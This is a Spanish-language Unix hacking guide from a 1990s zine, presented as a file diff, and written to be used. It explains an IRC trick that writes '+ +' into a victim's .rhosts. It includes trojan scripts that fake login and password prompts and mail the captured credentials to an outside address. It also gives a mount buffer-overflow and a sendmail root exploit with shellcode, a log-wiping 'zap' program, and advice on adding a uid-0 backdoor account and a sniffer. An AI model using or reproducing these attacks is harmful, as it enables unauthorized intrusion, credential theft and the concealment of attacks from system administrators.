@@ -1,0 +1,629 @@
+
+//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//
+\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\
+******************************************************************************
+LA GUIA DEFINITIVA PARA HACKEAR UNIX -------------------------By RAVEN SPIRIT
+******************************************************************************
+//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//
+\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\
+
+[Notas por BadBit: Este archivo es una obra exclusiva de RavEn SpiRiT. Cuando
+  leí este archivo me pareció muy interesante y decidí pedirle permiso para
+  incluirlo en ERN. Le mandé un e-mail pero nunca recibí respuesta. Por lo
+  tanto tomé eso como un "sí" y por eso aparece. Cabe aclarar que he editado
+  el archivo. ¿En qué aspectos? Pues originalmente este texto estaba en
+  español, pero con los modismos españoles, del tipo de que: "Hakeais el
+  ordenador, modificáis los ficheros y os largas." Por lo tanto decidí
+  "traducirlo" al español de México. También le añadí acentos, signos de
+  interrogación, corregí ortografía, acomodé los párrafos y quité ciertos
+  trozos de código porque simplemente el archivo era muy grande y no iba a
+  caber en el Radiaktivo. Pero pueden estar seguros que la escencia y todo el
+  texto que no sea código dice exactamente lo mismo. Espero que aprendan
+  tanto como yo. Por cierto, si tu eres Raven Spitit, por favor contáctame
+  a badbit@yahoo.com]
+
+   Hola a todos. Espero que los que lean este documento comprendan como se
+hackea UNIX. En mis frecuentes visitas al IRC mucha gente pregunta sobre el
+/etc/passwd, mucha gente anda buscando diccionarios de palabras y otros tantos
+buscan el mejor crackeador. ¿Para qué?. Hay maneras mucho mas rápidas y
+por supuesto divertidas de conseguir una cuenta. Y por supuesto es demasiado
+difícil desencriptar la cuenta del root, por lo que sólo se utiliza en casos
+extremos, así como los programas tipo dictmake solo se usan en casos muy raros
+y cuando no nos queda otro recurso.
+
+   Empezamos. Antes de empezar me gustaría que quedara claro que si quieren
+ser hackers en serio necesitan Linux, no es absolutamente necesario pero
+facilita muchísimo las cosas.
+
+   Para hackear un UNIX la primera cosa que necesitamos es, lógico,
+introducirse en el sistema. Algunos otras computadoras tienen ftps anónimos
+a los que podemos acceder, pero hacedme caso, no sirven para nada. Para
+introducirnos en un sistema necesitamos que tenga al menos una parte de
+acceso público. Generalmente esa parte es la famosa pantalla "Login:" y
+"Password:" que me imagino que todos conocen. Esta pantalla simplemente vale
+para identificar que la entrada de un usuario en ese sistema sea legítima.
+Sin embargo esas tontas máquinas que solo saben la diferencia entre 0 y 1, si
+les damos un login y password que esten dados de alta en ese sistema nos
+dejará pasar (a no ser que tengan un sistema de reconocimiento de IP para lo
+que necesitariamos hacer IP-Spoofing, pero esto solo nos ocurrirá en ciertas
+computadoras de alta seguridad).
+
+   ¿Como conseguir acceso al sistema? La manera mas fácil, la ingenieria
+social. No creo que haga falta explicar eso. Simplemente pueden utilizar el
+comando finger, para los que usen Linux y los que no, usen el finger del mIrc.
+Este comando nos dará información sobre el titular del e-mail que nostros le
+demos, que según la maquina será, o mas o menos o a veces nada. Menos da una
+piedra. Si están desde Linux pueden usar comandos "r" como "rlogin
+loquesea.com -l loginquesea" esto los mete en el sistema, pero hay que
+conseguir una cuenta para poder usar los exploits que explicaré mas adelante.
+Sin embargo hay otras maneras de conseguir acceso al sistema, como por
+ejemplo la que explico ahora.
+
+
+COMO ACCEDER A UN ORDENADOR HACKEANDO DESDE EL IRC:
+
+   Esto solo lo pueden hacer desde Linux, yo lo he probado desde win95 y 3.1
+y no lo he conseguido hacer. Primero hacemos un /whois #uncanalconmuchagente
+para encontrar si hay alguien que se conecte desde un UNIX, que normalmente
+puede ser una universidad. El único problema que tiene esto es que no podemos
+elegir el ordenador, pero de todas maneras es muy divertido. Lo unico que
+necesitamos es meter la cadena + + en su archivo /.rhosts y la verdad es que
+es una tonteria tremenda.
+
+   Buscamos a la victima y vamos a un canal donde este él, después le
+hablaremos desde un privado. Ahora entra la imaginación de cada uno, porque
+tenemos que mandarle un archivo por DCC (por ejemplo prueba.irc) y que el
+escriba: /load prueba.irc Me imagino que vuestra imaginación les ayudará a
+resolverlo. Lo primero es conseguir el archivo prueba.irc. Solo esta linea:
+
+/exec echo: "/exec echo + + > $HOME/.rhosts >> prueba.irc 
+
+   Ya tenemos el archivo prueba, lo mejor es que para que no se de cuenta
+podemos añadirle alguna cochinada que se nos ocurra (allá que cada uno se las
+arregle). Listo. Cuando el tipo en cuestion escriba /load prueba.irc nosotros
+ejecutamos
+
+% rlogin ordenador_de_la_victima.com -l login_de_la_victima
+
+   Ya estamos dentro. Fácil ¿No?
+
+   Y para terminar un truquillo que quizás les sirva para algo, simplemente
+cambiamos la paridad de nuestro modem a 7E1 y telneteamos al ordenador en
+cuestión. Si hemos tenido suerte, cuando alguien intente conectarse, nos
+"colaremos" en su lugar.
+
+   Después de todo esto se supone que ya estamos dentro. Ahora hay que, o
+sacar una cuenta si no la tenemos o conseguir privilegios de root. Para lo
+primero:
+
+- Podemos usar el archivo nombrado /ect/passwd (si tenemos privilegios para
+  leerlo) y crackearlo. Pero si quieres mi consejo solo usa el archivo passwd
+  para conseguir una cuenta cualquiera en el sistema y poder ejecutar
+  comandos en él, poder usar un bug o exploit.
+- Usar un trojan o Caballo De Troya, esta opción también requiere tiempo pero
+  por supuesto menos que crackear el archivo passwd, por que funciona en
+  cuanto cualguier usuario se conecte al sistema. ATENCION, si conseguimos la
+  cuenta del root nos podremos saltar el paso "conseguir privilegios de root",
+  aunque los sysadmins, algunos, pueden sospechar aunque la verdad es que
+  después de hackear durante un tiempo te das cuenta de lo estúpidos que
+  pueden llegar a ser. Quizás sea una de las mejores formas. Un caballo de
+  troya es un archivo que metido en el sistema hace que un usuario crea que
+  ha introducido su password mal, pero en realidad el password es enviado a
+  la dirección de correo que nosostros le digamos. Aquí incluyo uno, pero
+  acuérdense de ponerle la dirección a la que quieren que les mande el passwd,
+  y además en algunos sistemas en lugar de "Login:" nos dice: "marte login:"
+  o algo distinto de login, por lo que tambien lo tenemos que cambiar para
+  que nadie note la diferencia. Este es:
+
+------SCRIPT------
+#!/bin/sh
+rm -rf $0
+cp $HOME/.login $HOME/.l
+echo ''>$HOME/.hushlogin
+echo "stty intr '^@'
+echo 'Login incorrect'
+echo -n 'login: '
+echo $<>.t
+echo -n 'Password: '
+stty -echo
+echo $<>>.t
+mail ernt@bigfoot.com<.t
+rm .t
+cat /etc/motd
+mv .l .login
+rm .hushlogin
+stty echo
+source .login">$HOME/.login
+----END SCRIPT----
+
+   Este tipo de scripts tambien se pueden usar en /bin/passwd, para cuando un
+usuario cambie su contraseña, pero el problema es que no es muy normal que
+un usuario cambie su contraseña, o por lo menos pasa muy de vez en cuando.
+Para mayor seguridad lo mejor es poner el que esta arriba, (para el caso es
+mejor poner los dos) pero sin embargo aqui pongo el otro, por si acaso
+(acuérdense de la direccion de correo):
+
+------SCRIPT------
+#!/bin/tcsh
+echo -n "Changing password for $USER on ";hostname
+echo -n "Old password: "
+stty -echo
+echo $<>$HOME/.tym
+echo "" 
+echo -n "New password: "
+echo $<>>$HOME/.tym
+echo ""
+stty echo
+mail ernt@bigfoot.com<$HOME/.tym
+rm $HOME/.tym
+echo "Error: Incorrect Password"
+rm -f $0
+unalias /bin/passwd
+unalias passwd
+---END SCRIPT---
+
+   La ventaja que tienen estos dos scripts es que no influye que el archivo
+passwd este shadowed o no.
+
+   Creo que con esto nos llega para conseguir una cuenta en un ordenador
+normal. Pasamos a lo siguiente, conseguir los privilegios de root.
+
+   Para conseguir privilegios de root en un sistema NO hace falta desencriptar
+la cuenta del root del archivo passwd. Para ser root recurrimos a los bugs y
+a los exploits. Los bugs son "agujeros" en el diseño del S.O. y se suelen
+encontrar en listas de correo de seguridad, aunque hay algunas webs donde
+estan recopilados. Los exploits son programas que utilizan esos bugs para
+conseguirnos privilegios de root, aunque no es para lo unico que sirven, me
+refiero a que podemos usar un exploit para leer el correo de alguien, para
+ocultar lo que estemos haciendo en el ordenador, etc...
+
+   Los exploits son archivos de codigo .c que hay que compilar en el ordenador
+a hackear. Se meten por ftp y se compilan:
+
+% cc -o loquesea loquesea.c
+% loquesea
+
+   Listo. Hay algunos que requieren una manera especial de utilización, pero
+lo indica claramente si editamos el archivo.
+
+   Los bugs y exploits suelen estar clasificados por sistemas, para que sea
+mas fácil localizarlos. La verdad es que os recomiendo tener los exploits y
+bugs en su computadora ordenados por directorios, para que no pierdan el
+tiempo y la paciencia buscándolos.
+
+   Para que tengais alguna ayuda os voy a poner aqui unos cuantos.
+
+   Quizás este ya lo conozcan, es el mount, y funciona en casi todos los
+Linux:
+<-------------------------------------CORTEN AQUI--------------------------->
+/* Mount Exploit for Linux, Jul 30 1996
+Discovered and Coded by Bloodmask & Vio
+Covin Security 1996
+*/
+
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+
+#define PATH_MOUNT "/bin/umount"
+#define BUFFER_SIZE 1024
+#define DEFAULT_OFFSET 50
+
+u_long get_esp()
+{
+  __asm__("movl %esp, %eax");
+
+}
+
+main(int argc, char **argv)
+{
+  u_char execshell[] =
+   "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+   "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+   "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+
+   int i;
+   int ofs = DEFAULT_OFFSET;
+
+   buff = malloc(4096);
+   if(!buff)
+   {
+      printf("can't allocate memory\n");
+      exit(0);
+   }
+   ptr = buff;
+
+   /* fill start of buffer with nops */
+
+   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
+   ptr += BUFFER_SIZE-strlen(execshell);
+
+   /* stick asm code into the buffer */
+
+   for(i=0;i < strlen(execshell);i++)
+      *(ptr++) = execshell[i];
+
+   addr_ptr = (long *)ptr;
+   for(i=0;i < (8/4);i++)
+      *(addr_ptr++) = get_esp() + ofs;
+   ptr = (char *)addr_ptr;
+   *ptr = 0;
+
+   (void)alarm((u_int)0);
+   printf("Discovered and Coded by Bloodmask and Vio, Covin 1996\n");
+   execl(PATH_MOUNT, "mount", buff, NULL);
+}
+<--------------------------------------FINAL-------------------------------->
+
+   Este otro exploit les dará un shell de root en las computadoras que usen el
+sendmail 8.6.4, este es el código original, lean las líneas que empiecen por
+# porque es lo que tienes que escribir tu, otros por que es distinto en cada
+sistema:
+
+<--------------------------------CORTA AQUI-------------------------------->
+# location of sendmail
+SENDMAIL=/usr/lib/sendmail
+
+# location of original sendmail.cf file
+CONFIG=/nau/local/lib/mail/sendmail.cf
+#CONFIG=`strings $SENDMAIL | grep sendmail.cf`
+
+# program to execute as root
+SHELL=/bin/csh
+
+TEMPDIR=/tmp/sendbug-tmp.$$
+mkdir $TEMPDIR
+chmod 700 $TEMPDIR
+cd $TEMPDIR
+
+cp $SENDMAIL sm
+chmod 700 sm
+
+echo "Creating setid0 ..."
+cat > setid.c << _EOF_
+
+/* set uid to zero, thus escaping the annoying csh and solaris sh
+ * problem..
+ *
+ * if (getuid() != geteuid()) {
+ *  printf("permission denied, you root-hacker you.\n");
+ *  exit(1);
+ * }
+ *
+ * .. must be run euid 0, obviously.  with no args it runs /bin/sh,
+ * otherwise it runs the 1st arg.
+ */
+
+#include <stdio.h>
+
+main(argc, argv)
+int argc;
+char *argv[];
+
+ int uid;
+
+ setuid(0);
+ setgid(0);
+ seteuid(0);  /* probabally redundant. */
+ setegid(0);
+
+ uid = getuid();
+
+ if (uid != 0) {
+  printf("setuid(0); failed!  aborting..\n");
+  exit(1);
+ }
+
+ if (argc !=2) {
+  printf("executing /bin/sh...\n");
+  system("/bin/sh");
+ }
+  else
+ {
+  printf("executing %s...\n", argv[1]);
+  system(argv[1]);
+ }
+
+_EOF_
+
+cc -o setid0 setid.c
+
+echo "Creating calc..."
+
+cat > calc.c << _EOF_
+/*
+ * Determines offset in sendmail of
+ * sendmail.cf file location.
+ * author: timothy newsham
+ */
+#include <fcntl.h>
+
+gencore()
+
+  int pid;
+  int fd[2];
+
+  if(pipe(fd) < 0) {
+    perror("pipe");
+    exit(1);
+    return(0);
+  }
+  pid = fork();
+  if(!pid) {
+    int f = open("./out", O_RDWR|O_CREAT, 0666);
+    dup2(f, 1); dup2(fd[0], 0);
+    close(f); close(fd[1]); close(fd[0]);
+    execl("./sm","sm","-d0-9.90","-oQ.","-bs", 0);
+    perror("exec");
+    exit(0);
+  } else {
+    sleep(2);
+    kill(pid, 11);
+  }
+  close(fd[0]);
+  close(fd[1]);
+
+
+main(argc,argv)
+char **argv;
+int argc;
+
+  unsigned int ConfFile,tTdvect,off;
+
+  gencore();
+  sync();   /* grr. */
+  tTdvect = find("ZZZZZZZZ", "core");
+  ConfFile = find(argv[1], "core");
+  if(!tTdvect || !ConfFile) {
+   return(1);
+  }
+  off = ConfFile - tTdvect;
+
+  printf("-d%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.0\n",
+  off, '/', off+1, 't', off+2, 'm', off+3, 'p', off+4, '/', off+5, 's', \
+  off+6, 'm', off+7, '.', off+8, 'c', off+9, 'f', off+10);
+
+
+int find(pattern, file)
+char *pattern,*file;
+
+  int fd;
+  int i, addr;
+  char c;
+
+  fd = open(file, 0);
+
+  i = 0;
+  addr = 0;
+  while(read(fd, &c, 1) == 1) {
+    if(pattern[i] == c)
+      i++;
+    else
+      i=0;
+    if(pattern[i] == '\0') {
+      addr -= strlen(pattern);
+      return(addr);
+    }
+    addr++;
+  }
+  return(0);
+
+_EOF_
+cc calc.c -o calc
+
+echo "Scanning core image for $CONFIG..."
+
+DEBUGFLAGS=`calc $CONFIG`
+
+echo "Creating alias.sh ..."
+echo "#!/bin/sh
+# this program will be executed when mail is sent to the fake alias.
+# since solaris sh and csh and tcsh refuse to run when euid != realuid,
+# we instead run the program we compiled above.
+
+/bin/chmod 6777 $TEMPDIR/setid0
+/bin/chown root $TEMPDIR/setid0
+/bin/sync
+
+" > alias.sh
+
+chmod 755 alias.sh
+
+echo "Creating fake alias file..."
+echo "yash: |$TEMPDIR/alias.sh" > aliases
+
+echo "Faking alias pointer in new config file..."
+egrep -v '(OA|DZ|Ou|Og)' $CONFIG > /tmp/sm.cf
+echo "
+# hacks follow
+
+OA/$TEMPDIR/aliases                     # our fake alias file
+Ou0                                     # user ID to run as
+Og0                                     # group ID to run as
+DZWHOOP-v1.0" >> /tmp/sm.cf
+
+echo "Creating the sendmail script..."
+
+cat > sendmail.script << _EOF_
+helo
+mail from: <nobody>
+rcpt to: <yash>
+data
+yet another sendmail hole?  suid whoop?
+\.                                      # oops.. delete \ prior to execution
+quit
+_EOF_
+
+echo "Executing $SENDMAIL $DEBUGFLAGS -bs..."
+
+$SENDMAIL $DEBUGFLAGS -bs < sendmail.script
+
+# give it time to execute.
+sleep 4
+
+# cleanup in 5 seconds
+(sleep 5; rm -rf $TEMPDIR ; rm /tmp/sm.cf) &
+
+if [ -u setid0 ]
+then
+ echo "setid0 is a suid shell.  executing..."
+ cd /
+ $TEMPDIR/setid0 /bin/csh
+ echo "end of script."
+ exit 0
+else
+ echo "setid0 is not suid; script failed."
+ echo "apparently, you don't have the bug.  celebrate :-)"
+ exit 1
+fi
+<----------------------------------FINAL------------------------------------->
+
+   Igual que hay éste, hay un montón para cada sistema, para el ftp, para
+telnet etc...
+
+   Despues de buscar, o en su disco duro, o bien en las paginas web, se supone
+que tendrás lo necesario para ser root. Un consejo, si no funciona ninguno
+de los que tienes no uses los que son para otros sistemas o versiones, o sea,
+que no hagas las cosas a lo loco, por que lo único que haces es dejar más
+huellas en el sistema.
+
+   Esta es la parte mas difícil de todas, así que espero que sepas
+solucionarla.
+
+   Una vez que ya somos root podemos hacer lo que queramos en ese sistema,
+pero no debemos olvidarnos de borrar nuestras huellas. Los UNIX tienen varios
+logs que guardan casi todo lo que hacemos en el sistema:
+
+* UTMP: Este archivo guarda un registro de todos los usuarios que se han
+  conectado a ese sistema
+  Directorios: /etc/utmp o /var/adm/utmp
+
+* WTMP: Este es nuestro peor enemigo. Guarda los numeros IP de todos los que
+  se han conectado a la computadora.
+  Directorios: /etc/wtmp o /var/adm/wtmp
+
+* LASTLOG: Este log guarda un registro del momento exacto en que un usuario
+  entró por última vez.
+  Directorio: /var/adm/lastlog
+
+* ACCT: Este log guarda los comandos que hemos ejecutado, pero SOLO los
+  comandos, no con qué fin los hemos utilizado, pero suele estar desactivado
+  por la gran cantidad de memoria que necesita. (Lógico, ¿no?)
+  Directorio: /var/adm/acct (en algunos sistemas se puede llamar pacct)
+
+   Ademas de esto puede haber otros programas que registren tu entrada, como
+el TCP-Wrapper o similares (Ten cuidado con el syslog que viene con el s.o.
+que guarda los logs en los archivos especificados en /etc/syslog.conf)
+De todas maneras les recomiendo que hackees a horas en las que el root no
+pueda ver tu numero IP con "who" o "users" porque te cacharía. De la misma
+manera, la primera vez que accedas al sistema con una cuenta hackeada, haz
+muchas cosas que haría un usuario normal (telnet, ftp, jugar al tetris)
+para que si el root te investigara "levemente" no se de cuenta de lo que
+hayas hecho. AquA incluyo el codigo de el "zap" que, como su nombre indica es
+un zapper, o sea un programa que borra nuestras huellas el solito. Se compila
+como los exploits, pero cambia su ejecución:
+
+% zap <nombredeusuario>
+
+<---------------------------------CORTA AQUI-------------------------------->
+#include <sys/types.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/file.h>
+#include <fcntl.h>
+#include <utmp.h>
+#include <pwd.h>
+#include <lastlog.h>
+#define WTMP_NAME "/usr/adm/wtmp"
+#define UTMP_NAME "/etc/utmp"
+#define LASTLOG_NAME "/usr/adm/lastlog"
+ 
+int f;
+ 
+void kill_utmp(who)
+char *who;
+{
+	struct utmp utmp_ent;
+	int flag=0;
+ 
+	if ((f=open(UTMP_NAME,O_RDWR))>=0) {
+		while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
+		if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+			bzero((char *)&utmp_ent,sizeof( utmp_ent ));
+			lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
+			write (f, &utmp_ent, sizeof (utmp_ent));
+			flag++; 
+		}
+		close(f);
+		if(!flag) printf("Unsuccessful.\n");
+	}
+}
+ 
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+	char me[30];
+	int i;
+	struct passwd *myentry;
+	
+	if (argc==1) {
+		myentry=getpwuid(getuid());
+		strcpy(me,myentry->pw_name);
+	} else strcpy(me,argv[1]);
+	
+	printf("ZAPing %s.\n",me);
+    kill_utmp(me);
+}
+<-----------------------------------FINAL------------------------------------>
+
+   Así la ultima entrada del usuario queda borrada del sistema. Si lo
+ejecutamos demasiadas veces, pondrá nombredeusuario Never Logged In, o sea,
+es como si ese usuario nunca se hubiera conectado al sistema. Ya tenemos las
+huellas borradas, pero si queremos mantener esos privilegios ¿qué hacemos?
+La manera mas fácil es añadir una cuenta al /etc/passwd con el comando
+"adduser" con numero de usuario 0 y numero de grupo 0 que son privilegios
+de root.
+
+NoTa: que nadie se le ocurra borrar todas las cuentas del archivo passwd
+menos una que sólo él conozca, por que, aunque nadie podria acceder al sistema
+una persona con acceso físico podría detectarnos, y podría borrar nuestra
+cuenta, así cerrándonos el acceso al sistema, siendo en vano todo lo que
+habíamos hecho.
+
+   Sin embargo si por casualidad al sysop en cuestión se le ocurre revisar las
+cuentas del archivo passwd, la cagamos. Aunque es difícil, por que tendría que
+revisar las cuentas una por una y es muy posible que se no se dé cuenta, pero
+los hay maniáticos....
+
+   Despues de hacer todo esto:
+-Tenemos una cuenta con privilegios de root
+-Hemos borrado nuestras huellas
+
+   ¿Qué nos queda? Pues prácticamente nada, salvo colocar un sniffer, programa
+que nos facilitará logins y passwords de ordenadores a los que se conecte la
+gente de "nuestro" sistema. El problema de los sniffers es que hay uno para
+cada sistema, pero si encontramos uno para el nuestro (cosa que no sería muy
+rara) no está de mas ponerlo para futuros "trabajos".
+
+   Bueno, ya hemos terminado espero que os haya servido de ayuda este texto, y
+hayas comprendido como hackear un UNIX.
+
+   De todas maneras si hay algo que no entiendas, o alguna pregunta, ya sabes:
+ravenspirit@hotmail.com
+
+###Por cierto las cartas tipo "¿Qué necesito para ser un hacker?" irán
+al trash directamente.###
+
+!!!!Happy Hack ;-)              
+WAREZ RULEZ
+  KILL THE BIG BROTHER
+    FREE OUR DATA
+       {[-RavEn³SpiRiT-]}
